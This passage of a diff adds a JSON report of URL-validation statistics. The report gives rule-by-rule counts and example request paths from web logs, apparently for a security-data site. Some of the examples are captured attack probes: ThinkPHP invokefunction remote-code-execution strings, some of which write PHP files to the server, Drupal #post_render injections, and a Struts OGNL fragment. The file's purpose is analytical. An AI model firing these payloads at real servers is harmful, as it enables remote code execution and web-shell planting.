+    "pct_sole": 0.0,
+    "unique_targets": 2,
+    "pct_unique": 0.0048,
+    "examples": [
+     "/honeypot/Honeypot - Howto.pdf?'\\xc2\\xb4%270x27;",
+     "/honeypot/BSidesDFW - 2014.ipynb?'\\xc2\\xb4%270x27;"
+    ]
+   },
+   "q.space": {
+    "lines": 1,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 1,
+    "pct_unique": 0.0024,
+    "examples": [
+     "/?s=index/\\\\think\\\\view\\\\driver\\\\Php/display&content=<?php phpinfo();?>"
+    ]
+   },
+   "q.fragment": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.raw_ctrl": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.other_forbidden_ascii": {
+    "lines": 54,
+    "pct_lines": 0.0017,
+    "sole_cause_lines": 8,
+    "pct_sole": 0.0003,
+    "unique_targets": 37,
+    "pct_unique": 0.0885,
+    "examples": [
+     "/user/password?name[%23post_render][0]=printf&name[%23markup]=ABCZ%0A",
+     "/?q=/user/password&name[%23post_render][0]=printf&name[%23markup]=ABCZ",
+     "//?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
+     "//?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
+     "//public/?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
+     "//public/?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+    ]
+   },
+   "q.dup_name": {
+    "lines": 10,
+    "pct_lines": 0.0003,
+    "sole_cause_lines": 4,
+    "pct_sole": 0.0001,
+    "unique_targets": 4,
+    "pct_unique": 0.0096,
+    "examples": [
+     "/?from=groupmessage&from=groupmessage",
+     "/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=iyygj.php&vars[1][]=",
+     "/?s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=ktxnl.php&vars%5B1%5D%5B%5D=",
+     "/?s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=txual.php&vars%5B1%5D%5B%5D="
+    ]
+   },
+   "h.userinfo": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ip_literal": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.bad_port": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.non_ascii": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.trailing_dot": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ipv4_noncanonical": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.underscore": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.label_not_ldh_other": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.reserved_rldh": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.bad_alabel": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.uppercase_repaired": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.port_nondefault": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.alabel_ok": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ipv4_ok": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.enc_unreserved_repaired": {
+    "lines": 3,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 3,
+    "pct_unique": 0.0072,
+    "examples": [
+     "/Datasets%20Description/PE%5fmalware/OPCleaver.html",
+     "/Security-Data-Analysis/Lab%5f1/conn.log.zip",
+     "/Datasets%20Description/PE%5fmalware/VirusShare.html"
+    ]
+   },
+   "p.lowercase_hex_repaired": {
+    "lines": 14,
+    "pct_lines": 0.0004,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 6,
+    "pct_unique": 0.0144,
+    "examples": [
+     "/honeypot/Honeypot%20-%20Howto.pdf&coi=1494&npp=10&p=0&pp=0&mid=9&ep=10&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto.pdf=B31AF913A68F4CA713911AAFFFCAAA6A",
+     "/honeypot/Honeypot%20-%20Howto.pdf&coi=1494&npp=2&p=0&pp=0&mid=9&ep=2&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto.pdf=6F0A41A35D7AB950AE829DFB16DDF4AB",
+     "/honeypot/Honeypot%20-%20Howto.pdf&coi=1494&npp=1&p=0&pp=0&mid=9&ep=1&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto.pdf=A2C1DFD001C4CB11B780AB2DF04BFEE1",
+     "/honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf&coi=1494&npp=10&p=0&pp=0&mid=9&ep=10&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto%2b-%2bBSides%2bAu",
+     "/honeypot/Honeypot%20-%20Howto.pdf&coi=1494&npp=6&p=0&pp=0&mid=9&ep=6&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto.pdf=652C78CDABA4B0F4DAD4B610B9732D78",
+     "/%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony."
+    ]
+   }
+  },
+  "ref_reasons_top": {
+   "308 path: trailing slash, X": 110442,
+   "400 query: pair must be exactly name=value": 59203,
+   "400 path: empty segment": 8009,
+   "400 query: ambiguous percent-escape X": 3814,
+   "400 path: ambiguous percent-escape X": 3258,
+   "400 path: forbidden character X": 2356,
+   "400 query: forbidden character X": 299,
+   "400 path: query/fragment in path kind": 179,
+   "400 path: bad percent-escape": 54,
+   "400 path: dot segment": 19,
+   "400 query: empty pair": 11,
+   "400 query: duplicate name": 4
+  }
+ }
+}
